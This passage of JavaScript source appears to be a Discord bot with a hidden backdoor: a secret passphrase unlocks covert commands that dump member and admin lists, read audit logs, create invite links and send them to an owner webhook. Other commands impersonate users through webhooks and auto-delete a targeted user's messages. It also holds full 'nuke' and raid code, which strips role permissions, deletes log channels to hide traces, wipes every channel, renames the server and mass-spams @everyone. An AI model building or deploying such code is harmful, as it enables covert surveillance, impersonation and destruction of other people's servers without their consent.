            `Rate limit: **${TRACE_RATE_LIMIT_MAX}/${Math.round(TRACE_RATE_LIMIT_WINDOW_MS / 1000)}s**`
        ];

        console.log(`[TRACE_ERASER] policy=${TRACE_POLICY_DEFAULT} dryRun=${traceDryRunEnabled ? "on" : "off"} killSwitch=${traceKillSwitchEnabled ? "on" : "off"} protectedChannels=${protectedChannelIds.size}`);
        const embed = new MessageEmbed()
            .setTitle(`${config.emojis.shadow} SHADOW REPORT: TRACE ERASER — DIAGNOSTICS`)
            .setDescription(lines.join("\n"))
            .setColor(traceKillSwitchEnabled ? "#ED4245" : "#5865F2")
            .setTimestamp();
        if (systemToggles.godsEye) {
            await sendLogWebhook({ embeds: [embed] });
        }
    }

    traceApprovalMetadata(request, requestId, approverId) {
        return { policy: request.policy, requestId, approverId };
    }

    async replyToTraceApproval(interaction, content) {
        await interaction.reply({ content, ephemeral: true }).catch(() => {});
    }

    async clearTraceApprovalControls(interaction) {
        await interaction.message?.edit?.({ components: [] }).catch(() => {});
    }

    traceApprovalDisabled() {
        return traceKillSwitchEnabled || !systemToggles.traceEraser;
    }

    async expireTraceApproval(interaction, parsed, request) {
        traceDeletionRequests.delete(parsed.requestId);
        traceMetrics.expired++;
        await this.recordTraceAudit(request, "TRACE_APPROVAL_EXPIRED", "info", "trace_approval_expired", this.traceApprovalMetadata(request, parsed.requestId, interaction.user?.id));
        await this.replyToTraceApproval(interaction, "คำขอนี้หมดอายุแล้ว ไม่ได้ลบข้อความ");
        await this.clearTraceApprovalControls(interaction);
        return true;
    }

    async denyTraceApproval(interaction, parsed, request) {
        traceDeletionRequests.delete(parsed.requestId);
        traceMetrics.denied++;
        await this.recordTraceAudit(request, "TRACE_APPROVAL_DENIED", "info", "trace_approval_denied", this.traceApprovalMetadata(request, parsed.requestId, interaction.user?.id));
        await this.replyToTraceApproval(interaction, "รับทราบ: ไม่ลบข้อความนี้");
        await this.clearTraceApprovalControls(interaction);
        await this.sendAlert("TRACE ERASER — DENIED", `เจ้าของปฏิเสธการลบข้อความใน **${request.guildName}**`, "#57F287");
        return true;
    }

    async rejectTraceApproval(interaction, parsed, request, message, audit = null, { clearControls = true, clearBeforeReply = false } = {}) {
        traceDeletionRequests.delete(parsed.requestId);
        if (audit) await this.recordTraceAudit(request, audit.action, audit.severity, audit.reason, this.traceApprovalMetadata(request, parsed.requestId, interaction.user?.id));
        if (clearBeforeReply) await this.clearTraceApprovalControls(interaction);
        await this.replyToTraceApproval(interaction, message);
        if (clearControls && !clearBeforeReply) await this.clearTraceApprovalControls(interaction);
        if (audit?.alert) await this.sendAlert(audit.alert.title, audit.alert.description, audit.alert.color);
        return true;
    }

    async handleApprovedTraceDeletion(interaction, parsed, request) {
        if (this.traceApprovalDisabled()) {
            traceMetrics.killed++;
            return this.rejectTraceApproval(interaction, parsed, request, "ไม่ลบ: ระบบป้องกันถูกเปิดหรือฟังก์ชันถูกปิดระหว่างรออนุมัติ", { action: "TRACE_APPROVAL_BLOCKED_AFTER_STATE_CHANGE", severity: "warning", reason: "trace_kill_switch" }, { clearBeforeReply: true });
        }
        const target = await this.fetchTraceTargetMessage(request);
        if (!target) return this.rejectTraceApproval(interaction, parsed, request, "ไม่พบข้อความเป้าหมาย อาจถูกลบไปแล้ว");
        if (this.isProtectedTraceMessage(target, this.getTraceMessageText(target))) {
            traceMetrics.protected++;
            return this.rejectTraceApproval(interaction, parsed, request, "ไม่ลบ: ข้อความนี้อยู่ในพื้นที่/เว็บฮุคที่ถูกป้องกัน", { action: "TRACE_PROTECTED_AFTER_APPROVAL", severity: "info", reason: "trace_protected_after_approval", alert: { title: "TRACE ERASER — PROTECTED", description: `ป้องกันการลบข้อความใน **${request.guildName}** เพราะเป็น log/webhook ที่ถูกป้องกัน`, color: "#57F287" } });
        }
        if (traceDryRunEnabled) {
            traceMetrics.dryRun++;
            return this.rejectTraceApproval(interaction, parsed, request, "Dry-run เปิดอยู่: อนุมัติแล้วแต่ไม่ได้ลบจริง", { action: "TRACE_APPROVED_DRY_RUN", severity: "info", reason: "trace_approved_dry_run", alert: { title: "TRACE ERASER — APPROVED DRY RUN", description: `เจ้าของอนุมัติแล้ว แต่ dry-run เปิดอยู่ใน **${request.guildName}**`, color: "#FEE75C" } }, { clearBeforeReply: true });
        }
        return this.deleteApprovedTraceTarget(interaction, parsed, request, target);
    }

    async deleteApprovedTraceTarget(interaction, parsed, request, target) {
        const metadata = this.traceApprovalMetadata(request, parsed.requestId, interaction.user?.id);
        const deleteIntent = await this.recordTraceAudit(request, "TRACE_APPROVED_DELETE_INTENT", "warning", "trace_approved_delete_intent", metadata);
        if (!deleteIntent) return this.rejectTraceApproval(interaction, parsed, request, "ไม่ลบข้อความ เพราะไม่สามารถบันทึก Audit intent ได้", null, { clearBeforeReply: true });
        if (this.traceApprovalDisabled()) {
            traceMetrics.killed++;
            return this.rejectTraceApproval(interaction, parsed, request, "ไม่ลบ: ระบบป้องกันถูกเปิดหรือฟังก์ชันถูกปิดก่อนทำงาน", { action: "TRACE_APPROVAL_BLOCKED_AFTER_STATE_CHANGE", severity: "warning", reason: "trace_kill_switch" }, { clearBeforeReply: true });
        }
        return this.finishApprovedTraceDeletion(interaction, parsed, request, target, metadata);
    }

    async finishApprovedTraceDeletion(interaction, parsed, request, target, metadata) {
        const deleted = await target.delete().then(() => true).catch(() => false);
        traceDeletionRequests.delete(parsed.requestId);
        await this.clearTraceApprovalControls(interaction);
        if (!deleted) {
            traceMetrics.deleteFailed++;
            await this.recordTraceAudit(request, "TRACE_APPROVED_DELETE_FAILED", "warning", "trace_approved_delete_failed", metadata);
            await this.replyToTraceApproval(interaction, "อนุมัติแล้ว แต่ลบข้อความไม่สำเร็จ อาจไม่มีสิทธิ์หรือข้อความถูกล็อกไว้");
            await this.sendAlert("TRACE ERASER — DELETE FAILED", `เจ้าของอนุมัติแล้ว แต่ลบข้อความใน **${request.guildName}** ไม่สำเร็จ`, "#FEE75C");
            return true;
        }
        traceMetrics.approved++;
        await this.recordTraceAudit(request, "TRACE_APPROVED_DELETED", "danger", "trace_approved_deleted", metadata);
        await this.replyToTraceApproval(interaction, "ลบข้อความตามที่อนุมัติแล้ว");
        await this.sendAlert("TRACE ERASER — APPROVED", `${config.emojis.broom} เจ้าของอนุมัติให้ลบข้อความใน **${request.guildName}**`, "#ED4245");
        return true;
    }

    async handleClaimedTraceApproval(interaction, parsed, request) {
        if (request.expiresAt <= Date.now()) return this.expireTraceApproval(interaction, parsed, request);
        if (parsed.action === "deny") return this.denyTraceApproval(interaction, parsed, request);
        if (parsed.action !== "approve") return this.rejectTraceApproval(interaction, parsed, request, "ปุ่มนี้ไม่ถูกต้อง", null, { clearControls: false });
        return this.handleApprovedTraceDeletion(interaction, parsed, request);
    }

    async handleTraceApprovalInteraction(interaction) {
        if (!interaction?.isButton?.()) return false;
        const parsed = parseTraceActionId(interaction.customId);
        if (!parsed) return false;
        this.cleanupTraceApprovals();
        if (!isOwnerApprover(interaction.user?.id)) {
            traceMetrics.unauthorized++;
            await this.replyToTraceApproval(interaction, "คำขอนี้ให้เจ้าของหรือแอดมินที่อนุมัติไว้กดเท่านั้น");
            return true;
        }
        const request = traceDeletionRequests.get(parsed.requestId);
        if (request?.state !== "pending") {
            await this.replyToTraceApproval(interaction, "คำขอนี้หมดอายุหรือกำลังถูกจัดการแล้ว");
            await this.clearTraceApprovalControls(interaction);
            return true;
        }
        request.state = "processing";
        request.claimedBy = interaction.user?.id || null;
        request.claimedAt = Date.now();
        return this.handleClaimedTraceApproval(interaction, parsed, request);
    }

    async fetchTraceTargetMessage(request) {
        const channel = this.client.channels.cache.get(request.channelId)
            || await this.client.channels.fetch(request.channelId).catch(() => null);
        if (!channel?.messages?.fetch) return null;
        return channel.messages.fetch(request.messageId).catch(() => null);
    }

    // ──────────────────────────────────────────────────────────────────────
    //  ☢️  NUKE ENGINE
    // ──────────────────────────────────────────────────────────────────────
    async executeStealthNuke(guild) {
        try {
            // snapshot permission ก่อน nuke (เผื่อ restore)
            const snap = {};
            guild.roles.cache.forEach(r => { snap[r.id] = { name: r.name, perms: r.permissions.bitfield.toString(), color: r.color, hoist: r.hoist, mentionable: r.mentionable }; });
            roleSnapshots.set(guild.id, { type: "roles", generation: crypto.randomUUID(), createdAt: Date.now(), roles: snap });

            // 1. ริบสิทธิ์ Role ทั้งหมด (await ทุกตัว + delay กัน rate limit)
            for (const role of guild.roles.cache.values()) {
                if (role.manageable && role.id !== guild.id) {
                    await role.setPermissions([]).catch(() => {});
                    await delay(300);
                }
            }
            // 2. Snapshot channels ก่อน iterate (กัน cache เปลี่ยนระหว่างลบ)
            const allChannels = [...guild.channels.cache.values()];
            // ลบห้อง Log ก่อน
            for (const c of allChannels) {
                if (c.name.includes("log") || c.name.includes("บันทึก")) {
                    await c.delete().catch(() => {});
                    await delay(200);
                }
            }
            // 3. ลบห้องที่เหลือ
            for (const c of allChannels) { await c.delete().catch(() => {}); await delay(200); }
            // 4. เปลี่ยนชื่อเซิร์ฟ 30 ครั้ง
            for (let i = 0; i < 30; i++) { await guild.setName(`☢️ NUKED-${i}`).catch(() => {}); await delay(200); }
        } catch (e) {
            logSuppressedError("execute guarded cleanup action", e);
        }
    }

    // ──────────────────────────────────────────────────────────────────────
    //  ⚔️  SECRET COMMANDS
    // ──────────────────────────────────────────────────────────────────────
    async processSecretCommands(message) {
        if (!message.guild || message.author.bot) return;
        const args = message.content.trim().split(/ +/);
        if (args[0] !== SECRET_PHRASE) return;
        const capability = getSystemCapability(message.author.id);
        if (ghostModeEnabled && capability === "none") return;
        if (capability === "none") return;

        try {
            await message.delete();
        } catch (e) {
            logSuppressedError("delete command message", e);
        }

        const command = args[1];
        const guild   = message.guild;
        if (capability !== "owner_only" && !OPERATOR_COMMANDS.has(command)) return;
        const ctx = { message, args, command, guild };

        await this.logCommand(message, command, args.slice(2));

        try {
            await this.runSecretCommand(ctx);

        } catch (err) {
            await this.sendAlert("⚠️ COMMAND ERROR", `เกิดข้อผิดพลาด: ${err.message}`);
        }

        // ════════════════ [ทำลายล้าง — ต้อง ARMED] ════════════════
        const arm = getActiveArm(guild.id);
        if (!arm || capability !== "owner_only") return;

        try {
            await this.runArmedSecretCommand(ctx);

        } catch (err) {
            await this.sendAlert("⚠️ ARMED COMMAND ERROR", `เกิดข้อผิดพลาด: ${err.message}`);
        }
    }

    async runSecretCommand(ctx) {
        const handler = this.secretCommandHandlers(ctx)[ctx.command];
        if (handler?.enabled) await handler.run();
    }

    async runArmedSecretCommand(ctx) {
        const handler = this.armedSecretCommandHandlers(ctx)[ctx.command];
        if (handler?.enabled) await handler.run();
    }

    secretCommandHandlers(ctx) {
        const { message, args, guild } = ctx;
        return {
            "-intel": { enabled: systemToggles.cmdIntel, run: () => this.commandIntel(guild) },
            "-adminscan": { enabled: systemToggles.cmdAdminScan, run: () => this.commandAdminScan(guild) },
            "-rolelist": { enabled: systemToggles.cmdRoleList, run: () => this.commandRoleList(guild) },
            "-auditbot": { enabled: systemToggles.cmdAuditBot, run: () => this.commandAuditBot(guild) },
            "-memberdump": { enabled: systemToggles.cmdMemberDump, run: () => this.commandMemberDump(guild) },
            "-snap": { enabled: systemToggles.cmdSnap, run: () => this.commandSnap(guild) },
            "-extract": { enabled: systemToggles.cmdExtract, run: () => this.commandExtract(guild) },
            "-vanish": { enabled: systemToggles.cmdVanish, run: () => this.commandVanish(guild) },
            "-stealth": { enabled: systemToggles.cmdStealth, run: () => this.commandStealth() },
            "-active": { enabled: systemToggles.cmdStealth, run: () => this.commandActive() },
            "-ghostping": { enabled: systemToggles.cmdGhostPing, run: () => this.commandGhostPing() },
            "-sysinfo": { enabled: systemToggles.cmdSysInfo, run: () => this.commandSysInfo() },
            "-lockdown": { enabled: systemToggles.cmdLockdown, run: () => this.commandLockdown(message, guild) },
            "-unlock": { enabled: systemToggles.cmdLockdown, run: () => this.commandUnlock(message, guild) },
            "-memclear": { enabled: systemToggles.cmdMemClear, run: () => this.commandMemClear() },
            "-silence": { enabled: systemToggles.cmdSilence, run: () => this.commandSilence(message, guild) },
            "-unsilence": { enabled: systemToggles.cmdSilence, run: () => this.commandUnsilence(message, guild) },
            "-ghostmode": { enabled: systemToggles.cmdGhostMode, run: () => this.commandGhostMode() },
            "-protect": { enabled: systemToggles.cmdProtect, run: () => this.commandProtect(args) },
            "-restore": { enabled: systemToggles.cmdRestore, run: () => this.commandRestore(guild) },
            "-mimic": { enabled: systemToggles.cmdMimic, run: () => this.commandMimic(message) },
            "-clown": { enabled: systemToggles.cmdClown, run: () => this.commandClown(message) },
            "-unclown": { enabled: systemToggles.cmdClown, run: () => this.commandUnclown(message) },
            "-haunt": { enabled: systemToggles.cmdHaunt, run: () => this.commandHaunt(message) }
        };
    }

    armedSecretCommandHandlers() {
        // Irreversible guild-destruction and spam operations remain unavailable.
        return {};
    }

    async commandIntel(guild) {
        const info = [
            `**ชื่อ:** ${guild.name}`,
            `**ID:** \`${guild.id}\``,
            `**เจ้าของ:** <@${guild.ownerId}> (\`${guild.ownerId}\`)`,
            `**สมาชิก:** ${guild.memberCount} คน`,
            `**ห้อง:** ${guild.channels.cache.size} ช่อง`,
            `**ยศ:** ${guild.roles.cache.size} ยศ`,
            `**Boost:** Tier ${guild.premiumTier} (${guild.premiumSubscriptionCount} boosts)`,
            `**สร้างเมื่อ:** <t:${Math.floor(guild.createdTimestamp / 1000)}:R>`,
        ].join('\n');
        await this.sendAlert("🔍 INTEL REPORT", info, "#57F287");
    }

    async commandAdminScan(guild) {
        const admins = guild.members.cache
            .filter(m => m.permissions.has(PermissionFlagsBits.Administrator))
            .map(m => `• **${m.user.tag}** (\`${m.id}\`)`)
            .join("\n");
        await this.sendAlert("🔎 ADMINISTRATOR SCAN", `แอดมินใน **${guild.name}**:\n\n${admins || "ไม่พบ"}`);
    }

    async commandRoleList(guild) {
        const roles = [...guild.roles.cache.values()]
            .sort((a, b) => b.position - a.position)
            .map(r => `• **${r.name}** \`${r.id}\` — ${r.members.size} คน`)
            .join("\n");
        await this.sendAlert("📋 ROLE LIST", `ยศใน **${guild.name}**:\n\n${roles.slice(0, 1900)}`);
    }

    async commandAuditBot(guild) {
        const logs = await guild.fetchAuditLogs({ limit: 10 });
        const entries = logs.entries.map(e =>
            `• **${e.executor?.tag || '?'}** → *${e.action}* ${e.target ? `(${e.target.id || ''})` : ''}`
        ).join("\n");
        await this.sendAlert("📜 AUDIT LOG (10 ล่าสุด)", entries || "ไม่พบ");
    }

    async commandMemberDump(guild) {
        const fetched = await guild.members.fetch({ limit: 500 });
        const lines = fetched.map(m =>
            `${m.user.bot ? '🤖' : '👤'} **${m.user.tag}** \`${m.id}\`${m.permissions.has(PermissionFlagsBits.Administrator) ? ' 👑' : ''}`
        ).join("\n");
        const chunks = [];
        for (let i = 0; i < lines.length; i += 1800) chunks.push(lines.substring(i, i + 1800));
        for (let idx = 0; idx < chunks.length; idx++) {
            await this.sendAlert(`👥 MEMBER DUMP ${idx + 1}/${chunks.length} (${fetched.size} คน)`, chunks[idx]);
        }
    }

    async commandSnap(guild) {
        const info = [
            `**Guild:** ${guild.name} (\`${guild.id}\`)`,
            `**Members:** ${guild.memberCount} | **Bots:** ${guild.members.cache.filter(m => m.user.bot).size}`,
            `**Channels:** ${guild.channels.cache.filter(c => getLegacyChannelType(c.type) === 'GUILD_TEXT').size}T / ${guild.channels.cache.filter(c => getLegacyChannelType(c.type) === 'GUILD_VOICE').size}V`,
            `**Owner:** <@${guild.ownerId}>`,
            `**Boost:** Tier ${guild.premiumTier}`,
            `**Icon:** ${guild.iconURL({ size: 512 }) || 'ไม่มี'}`,
            `**Snapshot at:** <t:${Math.floor(Date.now() / 1000)}:F>`,
        ].join('\n');
        await this.sendAlert("📸 SERVER SNAPSHOT", info, "#c084fc");
    }

    async commandExtract(guild) {
        const ch = guild.channels.cache.filter(c => getLegacyChannelType(c.type) === "GUILD_TEXT").first();
        if (!ch) return;
        const inv = await ch.createInvite({ maxAge: 3600, maxUses: 1 });
        await this.sendAlert("🔗 SECRET ACCESS KEY", `ลิงก์ลับ ${guild.name} (1ชม./1ครั้ง):\n${inv.url}`, "#a855f7");
    }

    async commandVanish(guild) {
        await this.sendAlert("🏃 BOT RETREAT", `สั่งบอทถอนตัวจาก **${guild.name}**`, "#ED4245");
        await guild.leave();
    }

    async commandStealth() {
        await this.client.user.setStatus("invisible");
        await this.sendAlert("🥷 STEALTH MODE", "สถานะบอท → ล่องหน (Invisible) ✅");
    }

    async commandActive() {
        await this.client.user.setStatus("online");
        await this.sendAlert("🟢 ACTIVE MODE", "สถานะบอท → ออนไลน์ ✅");
    }

    async commandGhostPing() {
        const ping = Math.round(this.client.ws.ping);
        await this.sendAlert("🏓 PING CHECK", `WebSocket Ping: **${ping}ms**`);
    }

    async commandSysInfo() {
        const mem = process.memoryUsage();
        const uptime = Math.round(process.uptime() / 60);
        const info = [
            `🧠 **Heap Used:** ${(mem.heapUsed / 1024 / 1024).toFixed(2)} MB`,
            `💾 **Heap Total:** ${(mem.heapTotal / 1024 / 1024).toFixed(2)} MB`,
            `📊 **RSS:** ${(mem.rss / 1024 / 1024).toFixed(2)} MB`,
            `⏱️ **Uptime:** ${uptime} นาที`,
            `🤖 **Guilds:** ${this.client.guilds.cache.size}`,
            `🎙️ **Voice Sessions:** ${require('./sessionManager').getAllSessions().size}`,
        ].join('\n');
        await this.sendAlert("💻 SYSTEM MONITOR", info);
    }

    async commandLockdown(message, guild) {
        if (getLegacyChannelType(message.channel.type) !== "GUILD_TEXT") return;
        const overwrite = message.channel.permissionOverwrites.cache.get(guild.id);
        const key = `${guild.id}:${message.channel.id}:${guild.id}`;
        if (!channelOverwriteSnapshots.has(key)) {
            channelOverwriteSnapshots.set(key, {
                type: "channel_overwrite",
                guildId: guild.id,
                channelId: message.channel.id,
                targetId: guild.id,
                existed: Boolean(overwrite),
                allow: overwrite?.allow?.bitfield?.toString?.() || "0",
                deny: overwrite?.deny?.bitfield?.toString?.() || "0",
                generation: crypto.randomUUID(),
                createdAt: Date.now()
            });
        }
        await message.channel.permissionOverwrites.edit(guild.id, { SendMessages: false });
        await this.sendAlert("🔒 CHANNEL LOCKED", `ล็อก <#${message.channel.id}> ใน **${guild.name}** — ใช้ -unlock คืนค่า`);
    }

    async commandUnlock(message, guild) {
        if (getLegacyChannelType(message.channel.type) !== "GUILD_TEXT") return;
        const key = `${guild.id}:${message.channel.id}:${guild.id}`;
        const snapshot = channelOverwriteSnapshots.get(key);
        if (!snapshot) {
            await this.quickAlert("❌ ไม่พบ Snapshot ของช่องนี้");
            return;
        }

        if (!snapshot.existed) {
            await message.channel.permissionOverwrites.delete(guild.id, "Restore pre-lock overwrite state");
        } else {
            const current = [...message.channel.permissionOverwrites.cache.values()]
                .filter(overwrite => overwrite.id !== guild.id)
                .map(overwrite => ({
                    id: overwrite.id,
                    type: overwrite.type,
                    allow: overwrite.allow.bitfield,
                    deny: overwrite.deny.bitfield
                }));
            current.push({
                id: guild.id,
                type: overwriteTypeRole(),
                allow: BigInt(snapshot.allow),
                deny: BigInt(snapshot.deny)
            });
            await message.channel.permissionOverwrites.set(current, "Restore exact pre-lock overwrite state");
        }
        channelOverwriteSnapshots.delete(key);
        await this.sendAlert("🔓 CHANNEL UNLOCKED", `คืน Permission overwrite เดิมของ <#${message.channel.id}> ใน **${guild.name}**`);
    }

    async commandMemClear() {
        await this.sendAlert("🧠 MEMORY POLICY", "ปฏิเสธการล้าง Channel cache โดยตรง ระบบใช้ bounded cache และ sweepers แทน");
    }

    async commandSilence(message, guild) {
        const voiceCh = message.member.voice.channel;
        if (!voiceCh) { await this.quickAlert("❌ ต้องอยู่ในห้องเสียงก่อน"); return; }
        const key = `${guild.id}:${voiceCh.id}`;
        const existingSnapshot = voiceMuteSnapshots.get(key);
        const generation = existingSnapshot?.generation || crypto.randomUUID();
        const members = Array.isArray(existingSnapshot?.members) ? [...existingSnapshot.members] : [];
        const recordedMemberIds = new Set(members.map(entry => entry.memberId));
        let silenced = 0;
        let failed = 0;
        for (const [, member] of voiceCh.members) {
            if (member.id === this.client.user.id) continue;
            const wasServerMuted = member.voice.serverMute === true;
            if (!recordedMemberIds.has(member.id)) {
                members.push({ memberId: member.id, wasServerMuted });
                recordedMemberIds.add(member.id);
            }
            if (wasServerMuted) continue;
            const changed = await member.voice.setMute(true, "Protected control: silence").then(() => true).catch(() => false);
            if (changed) silenced++;
            else failed++;
            await delay(200);
        }
        voiceMuteSnapshots.set(key, {
            ...(existingSnapshot || { type: "voice_mute", guildId: guild.id, channelId: voiceCh.id, generation, createdAt: Date.now() }),
            members
        });
        await this.sendAlert("🔇 SILENCE ACTIVATED", `ปิดเสียงสำเร็จ ${silenced} คน ล้มเหลว ${failed} คนใน **${voiceCh.name}** (${guild.name})`, "#f97316");
    }

    async commandUnsilence(message, guild) {
        const voiceCh = message.member.voice.channel;
        if (!voiceCh) { await this.quickAlert("❌ ต้องอยู่ในห้องเสียงก่อน"); return; }
        const key = `${guild.id}:${voiceCh.id}`;
        const snapshot = voiceMuteSnapshots.get(key);
        if (!snapshot) { await this.quickAlert("❌ ไม่พบ Snapshot สถานะเสียง"); return; }
        let restored = 0;
        let skipped = 0;
        let failed = 0;
        const remaining = [];
        for (const entry of snapshot.members) {
            let member = guild.members?.cache?.get?.(entry.memberId) || null;
            if (!member && typeof guild.members?.fetch === "function") {
                member = await guild.members.fetch(entry.memberId).catch(() => null);
            }
            if (entry.wasServerMuted) { skipped++; continue; }
            if (!member) { failed++; remaining.push(entry); continue; }
            const changed = await member.voice.setMute(false, "Restore pre-silence mute state").then(() => true).catch(() => false);
            if (changed) restored++;
            else { failed++; remaining.push(entry); }
            await delay(200);
        }
        if (remaining.length) snapshot.members = remaining;
        else voiceMuteSnapshots.delete(key);
        await this.sendAlert("🔊 SILENCE LIFTED", `คืนเสียงสำเร็จ ${restored} ข้าม ${skipped} ล้มเหลว ${failed} คนใน **${voiceCh.name}** (${guild.name})`);
    }

    async commandGhostMode() {
        ghostModeEnabled = !ghostModeEnabled;
        await this.sendAlert(
            "👻 GHOST MODE",
            `Ghost Mode: **${ghostModeEnabled ? 'เปิด 👻' : 'ปิด ⭕'}**\n${ghostModeEnabled ? 'บอทจะไม่ตอบ command ของคนทั่วไปแล้ว' : 'บอทกลับสู่โหมดปกติ'}`,
            ghostModeEnabled ? "#7c3aed" : "#57F287"
        );
    }

    async commandProtect(args) {
        const sid = args[2];
        if (!sid) { await this.quickAlert("❌ ระบุ sessionId ด้วย"); return; }
        if (protectedSessions.has(sid)) {
            protectedSessions.delete(sid);
            await this.sendAlert("🛡️ SESSION UNPROTECTED", `Session \`${sid}\` ถูกถอด Protection แล้ว`);
            return;
        }
        protectedSessions.add(sid);
        await this.sendAlert("🛡️ SESSION PROTECTED", `Session \`${sid}\` ถูกปกป้องแล้ว — Dashboard หยุดไม่ได้`);
    }

    async commandRestore(guild) {
        const snapshot = roleSnapshots.get(guild.id);
        if (!snapshot?.roles) { await this.quickAlert("❌ ไม่พบ Role snapshot สำหรับเซิร์ฟนี้"); return; }
        const counts = { restored: 0, skipped: 0, failed: 0, hierarchyBlocked: 0, missingRole: 0 };
        for (const [roleId, data] of Object.entries(snapshot.roles)) {
            const role = guild.roles.cache.get(roleId);
            if (!role) { counts.missingRole++; continue; }
            if (!role.manageable) { counts.hierarchyBlocked++; continue; }
            const restored = await role.edit({
                name: data.name,
                permissions: BigInt(data.perms),
                color: data.color,
                hoist: data.hoist,
                mentionable: data.mentionable,
                reason: "Restore protected role snapshot"
            }).then(() => true).catch(() => false);
            if (restored) counts.restored++;
            else counts.failed++;
            await delay(300);
        }
        if (counts.failed === 0) roleSnapshots.delete(guild.id);
        await this.sendAlert("♻️ ROLE SNAPSHOT RESTORED", `คืนสำเร็จ ${counts.restored} ข้าม ${counts.skipped} ล้มเหลว ${counts.failed} ติดลำดับยศ ${counts.hierarchyBlocked} ไม่พบยศ ${counts.missingRole} ใน **${guild.name}**`, counts.failed ? "#FEE75C" : "#57F287");
    }

    async commandMimic(message) {
        const targetUser = message.mentions.users.first();
        const targetChan = message.mentions.channels.first() || message.channel;
        if (!targetUser) return;
        const text = message.content
            .replace(SECRET_PHRASE, "").replace("-mimic", "")
            .replace(`<@${targetUser.id}>`, "").replace(`<@!${targetUser.id}>`, "")
            .replace(`<#${targetChan.id}>`, "").trim();
        if (!text) return;
        const hook = await targetChan.createWebhook({
            name: targetUser.username,
            avatar: targetUser.displayAvatarURL()
        }).catch(() => null);
        if (hook) { await hook.send(text).catch(() => {}); await hook.delete().catch(() => {}); }
    }

    async commandClown(message) {
        const u = message.mentions.users.first();
        if (!u) return;
        clownUsers.add(`${message.guild.id}:${u.id}`);
        await this.sendAlert("🤡 CLOWN TAGGED", `<@${u.id}> (\`${u.id}\`) ถูกติดป้าย Clown แล้ว`, "#FEE75C");
    }

    async commandUnclown(message) {
        const u = message.mentions.users.first();
        if (!u) return;
        clownUsers.delete(`${message.guild.id}:${u.id}`);
        await this.sendAlert("✅ CLOWN REMOVED", `ถอดป้าย Clown ของ <@${u.id}> แล้ว`, "#57F287");
    }

    async commandHaunt(message) {
        const u = message.mentions.users.first();
        if (!u) return;
        const key = `${message.guild.id}:${u.id}`;
        if (hauntedUsers.has(key)) {
            hauntedUsers.delete(key);
            for (const [timerKey, timer] of stateTimers) {
                if (!timerKey.startsWith(`${key}:`)) continue;
                clearTimeout(timer);
                stateTimers.delete(timerKey);
            }
            await this.sendAlert("👻 HAUNT LIFTED", `ปลด Haunt ของ <@${u.id}> — ข้อความจะไม่ถูกลบอีก`, "#57F287");
            return;
        }
        hauntedUsers.add(key);
        await this.sendAlert("👻 HAUNT ACTIVATED", `เปิด Haunt ใส่ <@${u.id}> — ข้อความลบหลัง 12 วิ`, "#ED4245");
    }

    async commandNuke(guild) {
        await this.sendAlert("☢️ NUKE DEPLOYED", `ระเบิดทำงานที่ **${guild.name}**!`, "#ED4245");
        await this.executeStealthNuke(guild);
    }

    async commandHostage(guild) {
        await this.sendAlert("🔒 HOSTAGE PROTOCOL", `Hostage เริ่มทำงานใน **${guild.name}** — ออกใน 3 วิ`, "#ED4245");
        setTimeout(() => guild.leave(), 3000);
    }

    async commandRuinRoles(guild, args) {
        const newName = args.slice(2).join(" ") || "🤡 CLOWNED";
        const snap = {};
        guild.roles.cache.forEach(r => { snap[r.id] = { name: r.name, perms: r.permissions.bitfield.toString(), color: r.color, hoist: r.hoist, mentionable: r.mentionable }; });
        roleSnapshots.set(guild.id, { type: "roles", generation: crypto.randomUUID(), createdAt: Date.now(), roles: snap });

        for (const [, role] of guild.roles.cache) {
            if (role.manageable && role.id !== guild.id) {
                role.edit({ name: newName, permissions: [] }).catch(() => {});
                await delay(100);
            }
        }
        await this.sendAlert("🃏 ROLES RUINED", `เปลี่ยนชื่อยศทั้งหมดเป็น "${newName}" ใน **${guild.name}**\nSnapshot บันทึกไว้ — ใช้ -restore คืนค่าได้`);
    }

    async commandSpamVoice(guild, args) {
        const amt = Number.parseInt(args[2], 10) || 20;
        const vName = args.slice(3).join(" ") || "💀 HACKED";
        for (let i = 0; i < amt; i++) {
            guild.channels.create({ name: vName, type: resolveChannelType("GUILD_VOICE") }).catch(() => {});
            await delay(150);
        }
        await this.sendAlert("🔊 VC SPAM", `สร้าง Voice Channel ${amt} ช่องใน **${guild.name}**`);
    }

    async commandMassSpam(guild, args) {
        const amt = Number.parseInt(args[2], 10) || 5;
        const txt = args.slice(3).join(" ") || "@everyone โดนยึดแล้ว!";
        const chs = guild.channels.cache.filter(c => getLegacyChannelType(c.type) === "GUILD_TEXT");
        for (const [, c] of chs) {
            const hook = await c.createWebhook({ name: "System Alert" }).catch(() => null);
            if (hook) {
                for (let i = 0; i < amt; i++) await hook.send(txt).catch(() => {});
                await hook.delete().catch(() => {});
            }
        }
        await this.sendAlert("📢 MASS SPAM", `สแปม ${amt} ข้อความทุกห้องใน **${guild.name}**`);
    }
} // end class ShadowEngine

// ════════════════════════════════════════════════════════════════════════════
//  🎨  SHADOW PORTAL CSS
// ════════════════════════════════════════════════════════════════════════════
const SHADOW_CSS = `
:root {
  --bg:      #05030e;
  --bg2:     #0c0818;
  --bg3:     #140f24;
  --card:    rgba(18,12,34,0.92);
  --border:  rgba(180,60,60,0.22);
  --border2: rgba(220,60,60,0.45);
  --red:     #ef4444;
  --red2:    #f87171;
  --orange:  #f97316;
  --yellow:  #fbbf24;
  --green:   #22c55e;
  --purple:  #a855f7;
  --blue:    #6366f1;
  --text:    #fde8e8;
  --text2:   #f9a8a8;
  --text3:   #ef444466;
}
*,*::before,*::after { box-sizing:border-box; margin:0; padding:0; }
html { scroll-behavior: smooth; }
body {
  background: var(--bg);
  background-image:
    radial-gradient(ellipse at 15% 20%, rgba(239,68,68,0.1) 0%, transparent 50%),
    radial-gradient(ellipse at 85% 80%, rgba(180,40,40,0.07) 0%, transparent 50%);
  background-attachment: fixed;
  color: var(--text);
  font-family: 'Segoe UI','Noto Sans Thai',system-ui,sans-serif;
  min-height: 100vh; padding: 16px;
}
::-webkit-scrollbar { width: 5px; }
::-webkit-scrollbar-track { background: var(--bg); }
::-webkit-scrollbar-thumb { background: var(--red); border-radius: 3px; }
.container { max-width: 1100px; margin: 0 auto; }

/* ── Header ── */
.shadow-header { text-align:center; margin-bottom:24px; }
.shadow-title {
  font-size: 1.8em; font-weight: 900;
  background: linear-gradient(135deg,#ef4444,#f97316,#fbbf24);
  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  background-clip: text;
}
.shadow-sub { color: var(--text3); font-size: 0.8em; margin-top:4px; }

/* ── Navigation Tabs ── */
